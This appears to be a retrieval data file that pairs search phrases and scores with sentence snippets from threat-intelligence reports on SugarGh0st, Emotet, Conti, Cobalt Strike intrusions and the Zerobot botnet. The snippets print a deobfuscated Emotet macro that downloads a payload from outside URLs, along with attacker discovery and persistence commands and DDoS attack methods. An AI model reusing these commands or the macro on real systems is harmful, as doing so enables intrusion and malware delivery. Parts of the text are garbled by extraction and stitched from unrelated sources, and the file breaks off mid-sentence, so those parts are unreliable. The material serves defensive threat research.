using a batch script|0.7570111665204079|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
using a batch script|0.7570111665204079|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 5/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 6/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
batch script|0.8302253897099442|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
batch script|0.8302253897099442|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 5/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 6/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
C:\Windows\system32\cmd.exe /C|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
C:\Windows\system32\cmd.exe /C|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
The document came in via email in the form of a zip file which included an xls file.|1.0000000000000002|"['Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.', 'This was the last activity we observed from this group.', 'These cases commonly end up with ransomware in addition to data exfiltration.', 'This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.ServicesWe offer multiple services including aThreat Feed servicewhich tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.', 'More information on this service and others can be foundhere.We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under ourSecurity Researcher and Organizationservices.TimelineAnalysis and reporting completed by@Kostastsaleand@IcsNickInitial AccessThe threat actor gained access to the environment after a user opened an Excel document and enabled macros.', 'The document came in via email in the form of a zip file which included an xls file.', 'Thanks for sharing@proxylife!The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.To deobfuscate the document the tool xlmdeobfuscator was used with the following output.After deobfuscation and cleaned up, the code in the macro looks as follows.=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""http[:]//praachichemfood[.', ']com/wp-content/Mwmos/"",""..\\\\hvxda.ocx"",0,0)   =IF(JRSJG1<0,CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""https[:]//lopespublicidade[.', ']com/cgi-bin/e5R5oG4iEaQnxQrZDh/"",""..\\\\hvxda.ocx"",0,0))   =IF(JRSJG2<0,CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""https[:]//bosny[.', ']com/aspnet_client/rnMp0ofR/"",""..\\\\hvxda.ocx"",0,0))   =IF(JRSJG3<0,CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""http[:]//seasidesolutions[.', ']com/cgi-bin/WLoO6sEzYCJ3LTlC/"",""..\\\\hvxda.ocx"",0,0))   =IF(JRSJG4<0,CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,""http[:]//borgelin[.']"
After deobfuscation|0.7502358581181763|['It starts with a handle with the value 4 and verifies it by doing GetFileSize on it.', 'If this fails it does ADD ESI,4 again (adds 4 to the handle) until the API succeeds.', 'When this happens it checks the file offset 0x8300 for the marker 0x54405450.', 'Again, if this matches up, it allocates memory into which it reads the file content and jumps to the 2nd level shellcode with a JMP EBX.Second Level Shell Code Analysis Now we have landed into the second level shellcode, but it is obfuscated to evade static analysis.', 'At the initial stage there are few instructions waiting to help us.', 'This is the deobfuscation code.', 'We can see that 0x23B * 4 is the number of bytes obfuscated, POP EBX is the get EIP instruction and 0x5687F945 is the deobfuscation XOR key.In following code we can see the hexadecimal value that corresponds to the library name being pushed to the LoadLibrary function, as well as two loops to get the API addresses using CALL 02E203E2 function.', 'Here also it uses hashes to look up APIs.', 'Hash API Hash API 73E2D87E ExitProcess 0C0397EC GlobalAlloc 7CB922F6 GlobalFree 10FA6516 ReadFile 36EF7370 GetCommandLineA 76DA08AC SetFilePointer 0E8AFE98 WinExec DF7D9BAD GetFileSize E9238AD9 _lwrite 6DD38706 CoUninitialize E88A49EA _lcreat EB9E05F5 CoSetProxyBlanket 5B8ACA33 GetTempPathA 6E26C880 CoCreateInstance 0FFD97FB CloseHandle 7FC7A3CB CoInitializeExIn the following code it searches for the embedded VBS file inside the RTF file in memory.', 'It checks for the file size in a loop, and if the size is larger than 0x2000 then it sets the file ponter to 0x8C14 to compare with the VBS file marker as we can see in following screenshot.After finding the VBS marker in memory, it decrypts the VBS file in two iterations.', 'In the first loop it decrypts and in the second loop it swaps the low and high bytes of the first 0x100 16-bit words, after which it writes the file to a file named Temp/ew_Rg.vbs.Payload .VBS file Analysis The following screenshot shows a part of the .VBS payload file dropped by .RTF file.']
whoami.exe|0.8907635266335051|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
cmd.exe /C whoami|0.7614521568613202|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.|0.7574323514566697|"['After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.', 'The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.', 'They then successfully escalated to SYSTEM privileges via Cobalt Strikes built-in named pipe impersonation (GetSystem)functionality.The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.', 'During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.', 'After a brief gap of 15 minutes, the threat actors usedPsExec,to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.', 'This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.', 'Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification.Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.', 'Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.', 'The ransomware note left by the infection included a link to their Tor site for further details.After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid.ServicesWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc.', 'More information on this service and others can be foundhere.We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under ourSecurity Researcher and Organizationservices.TimelineAnalysis and reporting completed by@pigerlin,@MetallicHack,@yatinwad, and 1 unnamed contributor.Reviewed by@kostastsale,@RoxpinTeddy, and@TheDFIRReportMITRE ATT&CKInitial AccessTheIcedID DLLthat we executed was most likely dropped through a zip file, which included a JavaScript file within it.Bradhad a few posts about these around the time of this intrusion.12Thanks Brad!Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.rundll32.exe ""C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Temp\\\\rate_x32.dat"",update /i:""LaborBetray\\\\license.dat""DiscoveryIcedID ran initial discovery after being executed on the beachhead.', 'Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc .ipconfig /allsysteminfowhoami /groupsnet config workstationnltest /domain_trustsnltest /domain_trusts/all_trustsnet view /all /domainnet view /allnew group ""Domain Admins"" /domainAdditional discovery commands were executed by Cobalt Strike.cmd.exe /C whoami /groupscmd.exe /C query sessioncmd.exe /C dir %HOMEDRIVE%%HOMEPATH%cmd.exe /C nltest /domain_trustscmd.exe /C nltest /dclist:cmd.exe /C net group ""Enterprise admins"" /domaincmd.exe /C net group ""Domain admins"" /domainAfter moving laterally to a domain controller, they began looking for what networks were present in the environment usingdsquery.cmd.exe /C dsquery subnet -limit 0Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.)']"
propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials|0.8821999214735932|['We have tracked advertisements for the Zerobot botnet on various social media networks in addition to other announcements regarding the sale and maintenance of the malware, as well as new capabilities in development.In this blog post, we present information about the latest version of the malware, Zerobot 1.1, including newly identified capabilities and further context to Fortinets recentanalysison the threat.', 'Zerobot 1.1 increases its capabilities with the inclusion of new attack methods and new exploits for supported architectures, expanding the malwares reach to different types of devices.', 'In addition to these findings, were sharing new indicators of compromise (IOCs) and recommendations to help defenders protect devices and networks against this threat.What is Zerobot?Zerobot affects a variety of devices that include firewall devices, routers, and cameras, adding compromised devices to a distributed denial of service (DDoS) botnet.', 'Using several modules, the malware can infect vulnerable devices built on diverse architectures and operating systems, find additional devices to infect, achieve persistence, and attack a range of protocols.', 'Microsoft tracks this activity as DEV-1061.April 2023 update Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather.DEV-1061is now tracked asStorm-1061.To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog:Microsoft shifts to a new threat actor naming taxonomy.The most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891 respectively), and new DDoS attack capabilities.How Zerobot gains and maintains device accessIoT devices are often internet-exposed, leaving unpatched and improperly secured devices vulnerable to exploitation by threat actors.', 'Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.', 'The malware may attempt to gain device access by using a combination of eight common usernames and 130 passwords for IoT devices over SSH and telnet on ports 23 and 2323 to spread to devices.', 'Microsoft researchers identified numerous SSH and telnet connection attempts on default ports 22 and 23, as well as attempts to open ports and connect to them by port-knocking on ports 80, 8080, 8888, and 2323.In addition to brute force attempts on devices, Zerobot exploits dozens of vulnerabilities, which malware operators add on a rolling basis to gain access and inject malicious payloads.', 'Zerobot 1.1 includes several new vulnerabilities, such as:VulnerabilityAffected softwareCVE-2017-17105Zivif PR115-204-P-RSCVE-2019-10655GrandstreamCVE-2020-25223WebAdmin of Sophos SG UTMCVE-2021-42013ApacheCVE-2022-31137Roxy-WICVE-2022-33891Apache SparkZSL-2022-5717MiniDVBLinuxSince the release of Zerobot 1.1, the malware operators have removed CVE-2018-12613, a phpMyAdmin vulnerability that could allow threat actors to view or execute files.', 'Microsoft researchers have also identified that previous reports have used the vulnerability ID ZERO-32906 for CVE-2018-20057, GPON for CVE-2018-10561, and DLINK for CVE-2016-20017; and that CVE-2020-7209 was mislabeled as CVE-2017-17106 and CVE-2022-42013 was mislabeled as CVE-2021-42013.Microsoft researchers have also found new evidence that Zerobot propagates by compromising devices with known vulnerabilities that are not included in the malware binary, such as CVE-2022-30023, a command injection vulnerability in Tenda GPON AC1200 routers.Upon gaining device access, Zerobot injects a malicious payload, which may be a generic script calledzero.shthat downloads and attempts to execute Zerobot, or a script that downloads the Zerobot binary of a specific architecture.', 'The bash script that attempts to download different Zerobot binaries tries to identify the architecture by brute-force, attempting to download and execute binaries of various architectures until it succeeds, as IoT devices are based on many computer processing units (CPUs).']
default or weak credentials|0.7656928959580426|['o Network traffic from the internet to closed group SATCOM networks.', 'o Brute force login attempts over SATCOM network segments.', 'See the Office of the Director of National Intelligence (ODNI) Annual Threat Assessment of the U.S. Intelligence Community, February 2022 for specific state-sponsored cyber threat activity relating to SATCOM networks.', 'Mitigations for SATCOM Network Providers and Customers Use secure methods for authentication, including multifactor authentication where possible, for all accounts used to access, manage, and/or administer SATCOM networks.', 'o Use and enforce strong, complex passwords: Review password policies to ensure they align with the latest NIST guidelines.', 'o Do not use default credentials or weak passwords.', 'o Audit accounts and credentials: remove terminated or unnecessary accounts; change expired credentials.', 'Enforce principle of least privilege through authorization policies.', 'Minimize unnecessary privileges for identities.', 'Consider privileges assigned to individual personnel accounts, as well as those assigned to non-personnel accounts (e.g., those assigned to software or systems).', 'Account privileges should be clearly defined, narrowly scoped, and regularly audited against usage patterns.']
malicious payload|0.7525617342636448|['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOOLSET AND STRATEGIC COOPERATIONS Authors: Zuzana Hromcov Anton CherepanovTLP: WHITE 2 InvisiMole: The hidden part of the story CONTENTS 1 EXECUTIVE SUMMARY                             4 2 ATTACKS AND INVESTIGATION                         4 2.1 InvisiMoles toolset .', '.', '.', '.', '.', '.', '.']
malicious payload|0.7525617342636448|"['This site had previously hosted a Cobalt Strike Team Server.Further digging reveals a set of three PDFs used as malicious phishing lures, which are linked to the *.microsoftdocs.workers[.', ']dev domains.', 'These lures all target victims in India, either promising information regarding new India-specific income taxation rules or COVID-19 advisories.The first lure Income tax new rules for NRI.pdf.lnk contains both a PDF document and an embedded PowerShell script.', 'Upon execution, the PDF is displayed to the user, after which the PowerShell is executed in the background.Figure 4: Phishing lure 1The PowerShell script downloads and executes a payload via %temp%\\\\conhost.exe, which loads a payload file called ""event.dat.""', 'This .DAT file is a Cobalt Strike Beacon.The second and third lures each have similar execution flows and component parts; a PDF lure, conhost.exe, and an event.', '* payload.', 'In this case, these event files had a .LOG extension, rather than .DAT.The biggest difference between the second and third lures is that one uses a self-extracting archive named India records highest ever single day covid_19 recoveries.pdf.exe, and the other uses a ZIP file named India records highest ever single day COVID-19 recoveries.zip.Figure 5: Contents of lures 2 and 3Lures two and three also contain the same information within their respective PDFs.', 'Both relate to a record high number of COVID-19 recoveries in India, information which purports to be from the Indian Government Ministry of Health & Family Welfare.Figure 6: Phishing lure 2 and 3 PDF contentsBy extracting the configurations from each of the three lures event.', '* Beacon payloads, we can see that the C2 server address used in the configuration data differs slightly:Lure-1 uses ccdn[.', ']microsoftdocs.workers.dev/en-us/windows/apps/Lure-2 & 3 use cdn[.', ']microsoftdocs.workers.dev/en-us/windows/apps/The same can be seen for the HttpGet_Metadata and HttpPost_Metadata host addresses:Lure-1 uses ccdn[.']"
downloads|0.8243145697171357|['Standalone EXE.', 'Presumed to be an earlier version before 2014 2015.04 CRYPTBASE.dll Assumed to have been created in December 2014.', 'Independent DLL.', 'Collect system information and file information within the USB flash drive.', '2015.06 BrWeb.dll, wsmt.exe Loads BrWeb.dll by patching a Brother Printer-related file.', 'Downloads files.', 'ALYAC25.exe patch function.', 'Scans *.hwp files.', 'Infects EXE files.', 'Additional malware is found.', '2015.06 CRYPTBASE.dll, svcmgr.exe Bnb Solution comparison functions were added.']
TCP_HANDSHAKEFloods with TCP handshakes.TCP_SOCKETContinuously sends random payloads on an open TCP socket.|0.916801217385006|['See detection details below.To achieve persistence on Linux-based devices, Zerobot uses a combination of desktop entry, daemon, and service methods:Desktop entry:Zerobot copies itself to$HOME/.config/ssh.service/sshfthen writes a desktop entry file calledsshf.desktopto the same directory.', 'Older Linux versions use$HOME/.config/autostartinstead of$HOME/.config/ssh.service.Daemon:Copies itself to/usr/bin/sshfand writes a configuration at/etc/init/sshf.conf.Service:Copies itself to/etc/sshfand writes a service configuration at/lib/system/system/sshf.service, then enables the service (to make sure it starts at boot) with two commands:systemctl enable sshfservice enable sshfAll persistence mechanisms on older Linux versions usemy.binandmy.bin.desktopinstead ofsshfandsshf.desktop.New attack capabilitiesIn addition to the functions and attacks included in previous versions of the malware, Zerobot 1.1 has additional DDoS attack capabilities.', 'These functions allow threat actors to target resources and make them inaccessible.', 'Successful DDoS attacks may be used by threat actors to extort ransom payments, distract from other malicious activities, or disrupt operations.', 'In almost every attack, the destination port is customizable, and threat actors who purchase the malware can modify the attack according to their target.The following are the previously known Zerobot capabilities:Attack methodDescriptionUDP_LEGITSends UDP packets without data.MC_PINGMeant for DDoS on Minecraft servers.', 'Sends a handshake and status request.TCP_HANDSHAKEFloods with TCP handshakes.TCP_SOCKETContinuously sends random payloads on an open TCP socket.', 'Payload length is customizable.TLS_SOCKETContinuously sends random payloads on an open TLS socket.', 'Payload length is customizable.HTTP_HANDLESends HTTP GET requests using a Golang standard library.HTTP_RAWFormats and sends HTTP GET requests.HTTP_BYPASSSends HTTP GET requests with spoofed headers.HTTP_NULLHTTP headers are each one random byte (not necessarily ascii).Previously undisclosed and new capabilities are the following:Attack methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.ICMP_FLOODSupposed to be an ICMP flood, but the packet is built incorrectly.TCP_CUSTOMSends TCP packets where the payload and flags are fully customizable.TCP_SYNSends SYN packets.TCP_ACKSends ACK packets.TCP_SYNACKSends SYN-ACK packets.TCP_XMASChristmas tree attack (all TCP flags are set).', 'The reset cause field is xmas.How Zerobot spreadsAfter persistence is achieved, Zerobot scans for other internet-exposed devices to infect.', 'The malware randomly generates a number between 0 and 255 and scans all IPs starting with this value.', 'Using a function callednew_botnet_selfRepo_isHoneypot, the malware tries to identify honeypot IP addresses, which are used by network decoys to attract cyberattacks and collect information on threats and attempts to access resources.']
TLS_SOCKETContinuously sends random payloads on an open TLS socket.|0.8472301948491413|['Older Linux versions use$HOME/.config/autostartinstead of$HOME/.config/ssh.service.Daemon:Copies itself to/usr/bin/sshfand writes a configuration at/etc/init/sshf.conf.Service:Copies itself to/etc/sshfand writes a service configuration at/lib/system/system/sshf.service, then enables the service (to make sure it starts at boot) with two commands:systemctl enable sshfservice enable sshfAll persistence mechanisms on older Linux versions usemy.binandmy.bin.desktopinstead ofsshfandsshf.desktop.New attack capabilitiesIn addition to the functions and attacks included in previous versions of the malware, Zerobot 1.1 has additional DDoS attack capabilities.', 'These functions allow threat actors to target resources and make them inaccessible.', 'Successful DDoS attacks may be used by threat actors to extort ransom payments, distract from other malicious activities, or disrupt operations.', 'In almost every attack, the destination port is customizable, and threat actors who purchase the malware can modify the attack according to their target.The following are the previously known Zerobot capabilities:Attack methodDescriptionUDP_LEGITSends UDP packets without data.MC_PINGMeant for DDoS on Minecraft servers.', 'Sends a handshake and status request.TCP_HANDSHAKEFloods with TCP handshakes.TCP_SOCKETContinuously sends random payloads on an open TCP socket.', 'Payload length is customizable.TLS_SOCKETContinuously sends random payloads on an open TLS socket.', 'Payload length is customizable.HTTP_HANDLESends HTTP GET requests using a Golang standard library.HTTP_RAWFormats and sends HTTP GET requests.HTTP_BYPASSSends HTTP GET requests with spoofed headers.HTTP_NULLHTTP headers are each one random byte (not necessarily ascii).Previously undisclosed and new capabilities are the following:Attack methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.ICMP_FLOODSupposed to be an ICMP flood, but the packet is built incorrectly.TCP_CUSTOMSends TCP packets where the payload and flags are fully customizable.TCP_SYNSends SYN packets.TCP_ACKSends ACK packets.TCP_SYNACKSends SYN-ACK packets.TCP_XMASChristmas tree attack (all TCP flags are set).', 'The reset cause field is xmas.How Zerobot spreadsAfter persistence is achieved, Zerobot scans for other internet-exposed devices to infect.', 'The malware randomly generates a number between 0 and 255 and scans all IPs starting with this value.', 'Using a function callednew_botnet_selfRepo_isHoneypot, the malware tries to identify honeypot IP addresses, which are used by network decoys to attract cyberattacks and collect information on threats and attempts to access resources.', 'This function includes 61 IP subnets, preventing scanning of these IPs.Microsoft researchers also identified a sample that can run on Windows based on a cross-platform (Linux, Windows, macOS) open-source remote administration tool (RAT) with various features such as managing processes, file operations, screenshotting, and running commands.']
methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.ICMP_FLOODSupposed to be an ICMP flood, but the packet is built incorrectly.TCP_CUSTOMSends TCP packets where the payload and flags are fully customizable.TCP_SYNSends SYN packets.TCP_ACKSends ACK packets.TCP_SYNACKSends SYN-ACK packets.TCP_XMASChristmas tree attack (all TCP flags are set).|0.8259116203832061|[]
process enumerations.|0.9257937380627873|['across For example, if there are five botnet too small to analyze.', '34 fields OR be a DDoS attack.', 'breaches, the sample size is five.', 'Exceptions are given to confirmed However, since each botnet used 2.', 'W e wont talk about count or data breaches with less than seven phishing, installed keyloggers and used percentage for small samples.', 'enumerations.', 'stolen credentials, there would be five This goes for figures too and is The incident must have at least one Social actions, five Hacking actions and why some figures lack the dot for known VERIS threat action category five Malware actions, adding up to 300%.', 'the median frequency.', '(Hacking, Malware, etc.).', 'This is normal, expected and handled 3.', 'For small samples, we may talk about correctly in our analysis and tooling.']
campaigns typically begin with a phishing email with a ZIP file attachment, containing a LNK file disguised as a Word document|0.9586552693356396|['Based on the documents content, academic and government employees, especially those in intelligence and cybersecurity, are probable targets for phishing emails containing this type of decoy document.2023 4 29 .pdfEnergy, manufacturing and supply chainThe second grouping of lure documents features a zip fileprojects in Libya.zipcontaining a LNK filePipelines Profile (Elfeel- Sharara-Mellitah + Wafa Mellitah).lnk, as well as additional English-language decoy files.', 'The decoy files are a Microsoft Word Document and PDF copy of a document titledProposed MOU GTE Korea.The documents appear to be legitimate and establish a written Memorandum of Understanding (MOU) between anauthentic privately owned Libyan energy company and a South Korean consulting firmspecializing in energy, procurement, construction and finance (EPC&F).', 'In addition, the zip contains a second non-malicious lure PDF titledMFZ Executive Summary Koreadetailing a feasibility study regarding the development and expansion of the sea port free zone of Misurata.Based on the decoy content, the likely recipients of this phishing campaign would be organizations or individuals involved with a construction project in the Middle East.', 'The Middle East has been a traditional customer for many large-scale construction projects for multiple 